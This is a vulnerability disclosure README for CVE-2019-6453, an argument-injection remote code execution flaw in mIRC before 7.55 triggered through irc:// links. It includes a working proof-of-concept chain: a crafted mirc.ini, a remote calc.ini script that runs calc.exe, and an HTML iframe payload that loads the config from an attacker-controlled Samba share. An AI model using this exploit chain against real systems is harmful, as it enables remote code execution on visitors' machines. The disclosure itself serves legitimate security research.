# CVE-2019-6453: RCE on mIRC <7.55 using argument injection through custom URI protocol handlers 

\[[Link to the write-up](https://proofofcalc.com/cve-2019-6453-mIRC/)\]


We found a **Remote Code Execution vulnerability** in mIRC through the
**irc://** URI protocol handler. Because mIRC doesn't use any kind of sigil such
as **--** to mark the end of the argument list, an attacker is able to pass
arguments to mIRC through a **irc://** link and execute arbitrary code by
loading a custom **mirc.ini** from an attacker-controlled Samba file server.
Please note that **ircs://** works the same way.

## PoC

The proof of calc requires three files: **mirc.ini**, **calc.ini** and
**poc.html**. We assume a Samba file server is running on the attacker's side.
For the sake of the example, the following pieces of code assume it is running
on host **127.0.0.1** (*i.e. replace **127.0.0.1** by your own server's address
in the following files to try this out*).

### mirc.ini

**mirc.ini** is a custom configuration file that should be located at
**C:\mirc-poc\mirc.ini** on the file server.

```conf
[rfiles]
n2=\\127.0.0.1\C$\mirc-poc\calc.ini
```

### calc.ini

**calc.ini** is a remote script file that should be located at
**C:\mirc-poc\calc.ini** on the file server.

```conf
[script]
n0=on *:START: {
n1=  /run calc.exe
n2=}
```

### poc.html

Just visiting **poc.html** should work assuming mIRC is set as the default
handler for the **irc://** URI scheme and the browser does not encode the
payload. Depending on the browser and your configuration, you might still get
a prompt (*not the case on Firefox*).


```html
<iframe src='irc://? -i\\127.0.0.1\C$\mirc-poc\mirc.ini' />
```

## PoC gif

![PoC gif](rce-poc.gif)

## Affected versions

This PoC runs for mIRC <7.55.

You can trigger the PoC on Edge 42.17134 (*last preview version*) and Firefox
64.0.2 (*last release*).
It doesn't work on Chrome because the way Chrome handle URI protocols (*URI is
encoded before being passed to the application*).

## Authors

- Baptiste Devigne ([Geluchat](https://twitter.com/Geluchat)) and Benjamin Chetioui ([SIben](https://twitter.com/_SIben_))
